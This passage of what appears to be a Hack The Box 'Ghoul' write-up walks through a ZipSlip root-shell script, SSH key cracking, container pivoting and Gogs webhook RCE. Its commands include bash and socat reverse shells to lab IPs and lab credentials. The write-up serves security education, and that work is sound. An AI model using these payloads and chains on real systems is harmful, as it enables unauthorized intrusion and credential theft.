+3:cpu,cpuacct:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+2:hugetlb:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+1:name=systemd:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+0::/system.slice/docker.service
+
+</span></code></pre></div></div>
+<p>There are some ssh keys in <code class="language-plaintext highlighter-rouge">/var/backups</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Aogiri:/$ </span><span class="nb">ls</span> /var/backups/backups/keys/  
+<span class="go">eto.backup  kaneki.backup  noro.backup
+</span></code></pre></div></div>
+<p>Looking at the running processes, I see both the <code class="language-plaintext highlighter-rouge">apache</code> processes running as www-data, and the <code class="language-plaintext highlighter-rouge">java</code> process for <code class="language-plaintext highlighter-rouge">tomcat</code>, which is running as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Aogiri:~/html$ </span>ps auxww
+<span class="go">USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root          1  0.0  0.4  55148 19292 ?        Ss   May19   1:19 /usr/bin/python /usr/bin/supervisord
+root         12  0.0  0.0   4628   776 ?        S    May19   0:00 /bin/sh /opt/apache.sh
+root         13  0.0  0.0  28356  2776 ?        S    May19   0:01 cron -f
+root         14  0.0  0.1  72296  6292 ?        S    May19   0:00 /usr/sbin/sshd -D
+root         16  0.0  0.0   4628   916 ?        S    May19   0:00 /bin/sh /usr/sbin/apache2ctl -DFOREGROUND
+root         17  0.1  4.4 4698764 178620 ?      Sl   May19   7:01 /usr/bin/java -Djava.util.logging.config.file=/usr/share/tomcat7/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Dignore.endorsed.dirs= -classpath /usr/share/tomcat7/bin/bootstrap.jar:/usr/share/tomcat7/bin/tomcat-juli.jar -Dcatalina.base=/usr/share/tomcat7 -Dcatalina.home=/usr/share/tomcat7 -Djava.io.tmpdir=/usr/share/tomcat7/temp org.apache.catalina.startup.Bootstrap start
+root         19  0.0  0.8 520568 33612 ?        S    May19   0:12 /usr/sbin/apache2 -DFOREGROUND
+www-data     51  0.0  0.5 523460 23544 ?        S    May19   0:08 /usr/sbin/apache2 -DFOREGROUND
+www-data  20635  0.0  0.5 523468 22824 ?        S    May22   0:07 /usr/sbin/apache2 -DFOREGROUND
+www-data  25363  0.0  0.4 522940 19656 ?        S    May23   0:08 /usr/sbin/apache2 -DFOREGROUND
+www-data  25371  0.0  0.4 522940 18496 ?        S    May23   0:08 /usr/sbin/apache2 -DFOREGROUND
+www-data  25399  0.0  0.5 523460 22744 ?        S    May23   0:07 /usr/sbin/apache2 -DFOREGROUND
+www-data  25405  0.0  0.5 523460 22760 ?        S    May23   0:07 /usr/sbin/apache2 -DFOREGROUND
+www-data  25418  0.0  0.4 522940 19656 ?        S    May23   0:07 /usr/sbin/apache2 -DFOREGROUND
+www-data  25423  0.0  0.4 522940 19656 ?        S    May23   0:07 /usr/sbin/apache2 -DFOREGROUND
+www-data  25424  0.0  0.5 523460 22744 ?        S    May23   0:07 /usr/sbin/apache2 -DFOREGROUND
+www-data  25427  0.0  0.5 523460 22688 ?        S    May23   0:07 /usr/sbin/apache2 -DFOREGROUND
+www-data  27463  0.0  0.0  36148  3328 pts/0    R+   07:11   0:00 ps auxww
+</span></code></pre></div></div>
+<h3 id="re-exploit-zip">Re-Exploit Zip</h3>
+<p>The site on 8080 that took my uploaded zip and processed it was the one run by the <code class="language-plaintext highlighter-rouge">java</code> process. I had used it to write to the apache directory, and that’s why I’m currently running as www-data. But since the ZipSlip was actually carried out by root, I suspect I can write other files as root, and not just a webshell. Arbitrary write is something that’s come up many times before in HTB, and there are <em>tons</em> of ways to get root from it. I’ll drop an ssh key into <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code></p>
+<h3 id="root-shell-script">Root Shell Script</h3>
+<p>I wrote a script to get a root shell on the first container. It creates a temp directory to work out of. In there, it creates an ssh key pair, then uses my ZipSlip script to create a zip. Then it uploads it, and connects over ssh. On ssh disconnect, it cleans up the temp directory.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">base</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="nv">sshkey</span><span class="o">=</span><span class="k">${</span><span class="nv">base</span><span class="k">}</span>/key
+<span class="nv">zip</span><span class="o">=</span><span class="k">${</span><span class="nv">base</span><span class="k">}</span>/z.zip
+
+<span class="nb">echo</span> <span class="s2">"[*] Creating ssh key pair"</span>
+ssh-keygen <span class="nt">-b</span> 2048 <span class="nt">-t</span> rsa <span class="nt">-f</span> <span class="k">${</span><span class="nv">sshkey</span><span class="k">}</span> <span class="nt">-q</span> <span class="nt">-N</span> <span class="s2">""</span>
+<span class="nb">chmod </span>600 <span class="k">${</span><span class="nv">sshkey</span><span class="k">}</span>
+
+<span class="nb">echo</span> <span class="s2">"[*] Creating zipslip zip with public key as authorized_keys"</span>
+./zip_slip.sh <span class="k">${</span><span class="nv">zip</span><span class="k">}</span> <span class="k">${</span><span class="nv">sshkey</span><span class="k">}</span>.pub /root/.ssh/authorized_keys 10 
+
+<span class="nb">echo</span> <span class="s2">"[*] Uploading zip to Ghoul"</span>
+curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.10.101:8080/upload <span class="nt">-H</span> <span class="s2">"Authorization: Basic YWRtaW46YWRtaW4="</span> <span class="nt">-F</span> <span class="s2">"file=@</span><span class="k">${</span><span class="nv">zip</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"File Uploaded Successfully"</span> <span class="o">||</span>
+    <span class="o">(</span><span class="nb">echo</span> <span class="s2">"[-] Failed to upload zip"</span> &amp; <span class="nb">exit</span><span class="o">)</span>
+<span class="nb">echo</span> <span class="s2">"[+] zip uploaded successfully"</span>
+
+<span class="nb">echo</span> <span class="s2">"[*] Connecting to Ghoul over SSH as root"</span>
+ssh <span class="nt">-i</span> <span class="k">${</span><span class="nv">sshkey</span><span class="k">}</span> root@10.10.10.101
+
+<span class="nb">rm</span> <span class="nt">-rf</span> <span class="k">${</span><span class="nv">base</span><span class="k">}</span>
+</code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./ghoul_shell.sh 
+<span class="go">[*] Creating ssh key pair
+[*] Creating zipslip zip with public key as authorized_keys
+Archive:  /tmp/tmp.Q8VNxuFb46/z.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+      391  2019-05-24 04:19   ../../../../../../../../../../root/.ssh/authorized_keys
+---------                     -------
+      391                     1 file
+[*] Uploading zip to Ghoul
+[+] zip uploaded successfully
+[*] Connecting to Ghoul over SSH as root
+Last login: Fri May 24 07:06:12 2019 from 10.10.14.3
+</span><span class="gp">root@Aogiri:~# </span><span class="w">
+</span></code></pre></div></div>
+<h3 id="usertxt">user.txt</h3>
+<p>From there, I can find <code class="language-plaintext highlighter-rouge">user.txt</code> in kaneki’s homedir:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:/home/kaneki# </span><span class="nb">ls</span> 
+<span class="go">note.txt  notes  secret.jpg  user.txt
+</span><span class="gp">root@Aogiri:/home/kaneki# </span><span class="nb">cat </span>user.txt 
+<span class="go">7c0f1104...
+</span></code></pre></div></div>
+<h3 id="note-about-intended-path">Note About Intended Path</h3>
+<p>It turns out that getting root on Aogiri was not part of the intended path through this box. The next step was supposed to be from www-data to kaneki, and then pivot from there. <code class="language-plaintext highlighter-rouge">tomcat</code> was not supposed to be running as root.</p>
+<p>I actually really liked the path of using the same vuln twice, and it’s how I solved it, so that’s what I showed here. The intended path was the use the ssh key that I’ll break in the next section to ssh in as kaneki, get <code class="language-plaintext highlighter-rouge">user.txt</code>, and proceed from there. There was no need to get root on this container.</p>
+<h2 id="pivot-to-kaneki-pc">Pivot to kaneki-pc</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="notes">Notes</h4>
+<p>There’s a few text files I can now access that.</p>
+<p><code class="language-plaintext highlighter-rouge">/home/kaneki/note.txt</code>:</p>
+<div class="language-plaintext wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/home/kaneki/notes</code>:</p>
+<div class="language-plaintext wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.
+DM me for the access.
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/home/Eto/alert.txt</code>:</p>
+<div class="language-plaintext wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hey Noro be sure to keep checking the humans for IP logs and chase those little shits down!
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/home/noro/to-do-txt</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Need to update backups.
+</code></pre></div></div>
+<p>Not all of this makes sense yet, but I know there are several other machines:</p>
+<ul>
+<li>Gogs</li>
+<li>kaneki’s pc</li>
+<li>file server (in server network)</li>
+</ul>
+<h4 id="other-hosts">Other Hosts</h4>
+<p>I’ll look for other hosts in the class C network 172.20.0.0/24 with a parallel ping sweep:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:~# </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..254<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.20.0.<span class="k">${</span><span class="nv">i</span><span class="k">}</span> | <span class="nb">grep</span> <span class="s2">"bytes from"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Unreachable"</span> &amp;<span class="o">)</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
+<span class="go">64 bytes from 172.20.0.1: icmp_seq=0 ttl=64 time=0.107 ms
+64 bytes from 172.20.0.10: icmp_seq=0 ttl=64 time=0.832 ms
+64 bytes from 172.20.0.150: icmp_seq=0 ttl=64 time=0.715 ms
+</span></code></pre></div></div>
+<p>To check out the ports, I’ll upload <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">static nmap</a> to the host.</p>
+<p>The .1 looks like it will be the Docker host, as it’s the gateway, and it’s open on the same ports as 10.10.10.103. Three of the ports (22, 80, and 8080) forward to the current container that I’m running in.</p>
+<p>The .150 host is only open on ssh:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:/tmp# </span>./nmap_64 <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 172.20.0.150
+<span class="go">
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-28 07:07 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.000017s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 02:42:AC:14:00:96 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
+</span></code></pre></div></div>
+<h4 id="ssh-keys">SSH keys</h4>
+<p>All four users (including root) have public and private rsa keys in their <code class="language-plaintext highlighter-rouge">.ssh</code> directories. There are also three keys in <code class="language-plaintext highlighter-rouge">/var/backups/backups/keys</code> that match the private keys from each of the three user home directories:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:/var/backups/backups/keys# </span><span class="nb">ls</span>
+<span class="go">eto.backup  kaneki.backup  noro.backup
+
+</span><span class="gp">root@Aogiri:/home/kaneki/.ssh# </span>diff id_rsa /var/backups/backups/keys/kaneki.backup
+<span class="go">
+</span><span class="gp">root@Aogiri:/home/kaneki/.ssh# </span>diff /home/Eto/.ssh/id_rsa /var/backups/backups/keys/eto.backup
+<span class="go">
+</span><span class="gp">root@Aogiri:/home/kaneki/.ssh# </span>diff /home/noro/.ssh/id_rsa /var/backups/backups/keys/noro.backup
+</code></pre></div></div>
+<p>For eto and noro, the <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> matches what’s in the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. kaneki’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file has the <code class="language-plaintext highlighter-rouge">id_rsa.pub</code>, as well as another:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:/home/kaneki/.ssh# </span><span class="nb">cat </span>authorized_keys 
+<span class="go">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl kaneki_pub@kaneki-pc
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri
+
+</span><span class="gp">root@Aogiri:/home/kaneki/.ssh# </span><span class="nb">cat </span>id_rsa.pub 
+<span class="go">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri
+</span></code></pre></div></div>
+<p>The other key was generated for a user named kaneki_pub on kaneki-pc. I’ll make sure to take note of that username.</p>
+<p>For the two unencrypted keys, I can ssh into Ghoul port 22 and get to this container. For example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh <span class="nt">-i</span> ~/id_rsa_ghoul_eto Eto@10.10.10.101
+<span class="gp">Eto@Aogiri:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>There’s not much to find with either. But it is important to note the usernames. For Eto, I have to log in as Eto, not eto, to match the account on the box.</p>
+<h3 id="crack-private-key">Crack Private Key</h3>
+<p>The only private key that’s encrypted is kaneki’s. <code class="language-plaintext highlighter-rouge">rockyou</code> can run over the key in a few seconds, but doesn’t find the password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>/opt/john/run/john <span class="nt">-wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt id_rsa_ghoul_kaneki.john 
+<span class="go">Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 3 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:07 DONE (2019-05-24 04:24) 0g/s 2025Kp/s 2025Kc/s 2025KC/s     1990..*7¡Vamos!
+Session completed
+</span></code></pre></div></div>
+<p>I’ll play with running <code class="language-plaintext highlighter-rouge">cewl</code> on various pages Ghoul and see if it turns out the password. The wordlist from <code class="language-plaintext highlighter-rouge">/secrets.php</code> works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>cewl http://10.10.10.101/secret.php <span class="nt">-w</span> secrets.wordlist
+<span class="go">CeWL 5.4.4.1 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/) 
+
+</span><span class="gp">root@kali# </span>/opt/john/run/john <span class="nt">-wordlist</span><span class="o">=</span>secrets.wordlist id_rsa_ghoul_kaneki.john 
+<span class="go">Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 3 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ILoveTouka       (id_rsa_ghoul_kaneki)
+1g 0:00:00:00 DONE (2019-05-24 04:26) 100.0g/s 11000p/s 11000c/s 11000C/s made..moment
+Session completed
+</span></code></pre></div></div>
+<p>Perhaps Kaneki accidentally pasted his password into the chat:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1558686439183.webp" type="image/webp"/>
+<img alt="1558686439183" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1558686439183.png"/>
+</picture>
+<h3 id="ssh-to-kaneki-pc">SSH to kaneki-pc</h3>
+<p>The password gives me access to the key, which I can use to ssh into this container as kaneki:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh <span class="nt">-i</span> ~/id_rsa_ghoul_kaneki kaneki@10.10.10.101
+<span class="go">Enter passphrase for key '/root/id_rsa_ghoul_kaneki': 
+Last login: Sun Jan 20 12:33:33 2019 from 172.20.0.1
+</span><span class="gp">kaneki@Aogiri:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I can also use the same key and password, along with the username kaneki_pub (which I found in the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file earlier), to ssh to the .150 in the same subnet:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:/home/kaneki/.ssh# </span>ssh <span class="nt">-i</span> id_rsa kaneki_pub@172.20.0.150
+<span class="go">Enter passphrase for key 'id_rsa': 
+Last login: Mon May 27 05:25:08 2019 from 172.20.0.10
+</span><span class="gp">kaneki_pub@kaneki-pc:~$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="pivot-to-gogs">Pivot to gogs</h2>
+<h3 id="local-enumeration">Local Enumeration</h3>
+<p>In the home folder there’s a <code class="language-plaintext highlighter-rouge">to-do.txt</code> that reads:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Give AogiriTest user access to Eto for git.
+</code></pre></div></div>
+<p>This implies that the AogiriTest user has access to some kind of shared git.</p>
+<h3 id="network-enumeration">Network Enumeration</h3>
+<p>This container has two network interfaces:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.20.0.150  netmask 255.255.0.0  broadcast 172.20.255.255
+        ether 02:42:ac:14:00:96  txqueuelen 0  (Ethernet)
+        RX packets 10291  bytes 2037462 (2.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 9527  bytes 1863298 (1.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.18.0.200  netmask 255.255.0.0  broadcast 172.18.255.255
+        ether 02:42:ac:12:00:c8  txqueuelen 0  (Ethernet)
+        RX packets 6970  bytes 1365731 (1.3 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7380  bytes 1537000 (1.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></code></pre></div></div>
+<p>There was a note about a server subnet - maybe this is that.</p>
+<p>Otherwise, the host is very empty. I’ll look for other boxes on this new subnet:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">kaneki_pub@kaneki-pc:~$ </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..254<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.18.0.<span class="k">${</span><span class="nv">i</span><span class="k">}</span> | <span class="nb">grep</span> <span class="s2">"bytes from"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Unreachable"</span> &amp;<span class="o">)</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
+<span class="go">64 bytes from 172.18.0.1: icmp_seq=0 ttl=64 time=0.151 ms
+64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.081 ms
+64 bytes from 172.18.0.200: icmp_seq=0 ttl=64 time=1.474 ms
+</span></code></pre></div></div>
+<p>The .1 is the same Docker host. The .2 is listening on two ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">kaneki_pub@kaneki-pc:~$ </span>/tmp/.nmap <span class="nt">--min-rate</span> 10000 <span class="nt">-p-</span> 172.18.0.2
+<span class="go">
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-28 07:13 GMT
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
+Host is up (0.00034s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 2.29 seconds
+</span></code></pre></div></div>
+<h3 id="gogs">Gogs</h3>
+<h4 id="tunnels">Tunnels</h4>
+<p>To get to the page, I’ll add a tunnel to each ssh session. On ssh into Aogiri:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-L 3000:127.0.0.1:3000
+</code></pre></div></div>
+<p>On ssh to kaneki:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-L 3000:172.18.0.2:3000
+</code></pre></div></div>
+<p>Now browse to localhost:3000 and I get the site:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1559040101702.webp" type="image/webp"/>
+<img alt="1559040101702" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1559040101702.png"/>
+</picture>
+<p>It’s an instance of Gogs.</p>
+<h4 id="gogs-background">Gogs Background</h4>
+<p><a href="https://gogs.io/">Gogs</a> is a self-hosted git instance. Basically think of GitHub, but open source and that you can host yourself. There are several CVEs for Gogs that I’ll check out, and <a href="https://github.com/TheZ3ro/gogsownz">this GitHub</a> has a good tool to exploit two of them. The background in this vulnerability (and much more) is  in <a href="https://2018.zeronights.ru/wp-content/uploads/materials/17-Who-owned-your-code.pdf">this presentation</a>, but basically as an admin user you can create a webhook which will run on commit which is basically RCE.</p>
+<h4 id="authentication">Authentication</h4>
+<p>First, I need to log in to the application. I’ll check a list of credentials I’ve collected from the box so far. I havfe a good feeling the user will be aogiritest, based on the <code class="language-plaintext highlighter-rouge">to-do.txt</code> I found earlier. After some guessing and password hunting on the containers I had access to, I managed to log in with “aogiritest” / “test@aogiri123” (password from Aogiri box <code class="language-plaintext highlighter-rouge">/usr/share/tomcat7/conf/tomcat-users.xml</code>).</p>
+<h3 id="shell-1">Shell</h3>
+<p>First I need to set up a tunnel. I’ll upload <code class="language-plaintext highlighter-rouge">socat</code> to the box. I’ll also notice that kaneki-pc can talk directly to my kali host, so I’ll just set up a <code class="language-plaintext highlighter-rouge">socat</code> tunnel there that listens and forwards back to me. (In later testing I’ll actually show that Gogs can talk directly back to me, but this is still safer when you don’t know.)</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">kaneki_pub@kaneki-pc:/tmp$ </span>./.socat tcp-listen:9001,reuseaddr,fork tcp:10.10.14.7:9001 &amp;
+<span class="go">[1] 2278
+</span></code></pre></div></div>
+<p>Now I can use https://github.com/TheZ3ro/gogsownz/blob/master/gogsownz.py. A couple things to note:</p>
+<p>1) changed line 91 to <code class="language-plaintext highlighter-rouge">if len(cookies) &lt; 1:</code> instead of <code class="language-plaintext highlighter-rouge">if len(cookies) != 1:</code></p>
+<p>2) changed all instances of <code class="language-plaintext highlighter-rouge">self.username not in resp</code> to <code class="language-plaintext highlighter-rouge">self.username not in resp.lower()</code>. That’s because <code class="language-plaintext highlighter-rouge">aogiritest</code> logs in as a valid username, but “AogiriTest” shows up in the page. So the script will fail thinking the username didn’t come back, when in fact, it did, just with camelcase. Alternatively, I could just use the camelcase username to login.</p>
+<p>Run it:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt/gogsownz# </span>python3 gogsownz.py http://127.0.0.1:3000/ <span class="nt">-v</span> <span class="nt">--creds</span> <span class="s1">'aogiritest:test@aogiri123'</span> <span class="nt">--rce</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/172.18.0.200/9001 0&gt;&amp;1'"</span> <span class="nt">--cleanup</span> <span class="nt">--burp</span>                                   
+<span class="go">[i] Starting Gogsownz on: http://127.0.0.1:3000
+[+] Loading Gogs homepage
+[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916
+[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.                                                                                                      
+[+] Performing login
+[+] Logged in successfully as aogiritest
+[+] Got UserID 2
+[+] Repository created successfully
+[i] Exploiting authenticated PrivEsc...
+[+] Uploading admin session as repository file
+[+] Uploaded successfully.
+[+] Committing the Admin session
+[+] Committed successfully
+[+] Removing Repo evidences
+[+] Repo removed successfully
+[i] Signed in as kaneki, is admin True
+[i] Current session cookie: 'acc4001337'
+[+] Got UserID 1
+[+] Repository created successfully
+[+] Setting Git hooks
+[+] Git hooks set successfully
+[+] Fetching last commit...
+[+] Got last commit
+[+] Triggering the RCE with a new commit
+[!] Can't commit on repo kaneki/gogstest
+</span></code></pre></div></div>
+<p>And shell connected back:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lnvp</span> 9001
+<span class="go">Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.101.
+Ncat: Connection from 10.10.10.101:40478.
+bash: cannot set terminal process group (31): Not a tty
+bash: no job control in this shell
+</span><span class="gp">bash-4.4$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">id
+uid=1000(git) gid=1000(git) groups=1000(git)
+</span></code></pre></div></div>
+<p>Since socat is on the host, I’ll re-exploit to get a <code class="language-plaintext highlighter-rouge">socat</code> reverse shell, which provides a full tty, which I’ll need:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 gogsownz.py http://127.0.0.1:3000/ <span class="nt">-v</span> <span class="nt">--creds</span> <span class="s1">'aogiritest:test@aogiri123'</span> <span class="nt">--rce</span> <span class="s2">"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.18.0.200:9001"</span> <span class="nt">--cleanup</span> <span class="nt">--burp</span>
+</code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>socat file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:9001
+<span class="gp">3713ea5e4353:~/gogs-repositories/kaneki/gogstest.git$ </span><span class="nb">id</span>
+<span class="go">uid=1000(git) gid=1000(git) groups=1000(git)
+</span></code></pre></div></div>
+<p>Now I have a shell in the Gogs container as the user git.</p>
+<h2 id="privesc-gogs-git--root">Privesc: Gogs git –&gt; root</h2>
+<p>In this container, there’s a suid binary, <code class="language-plaintext highlighter-rouge">gosu</code>:</p>
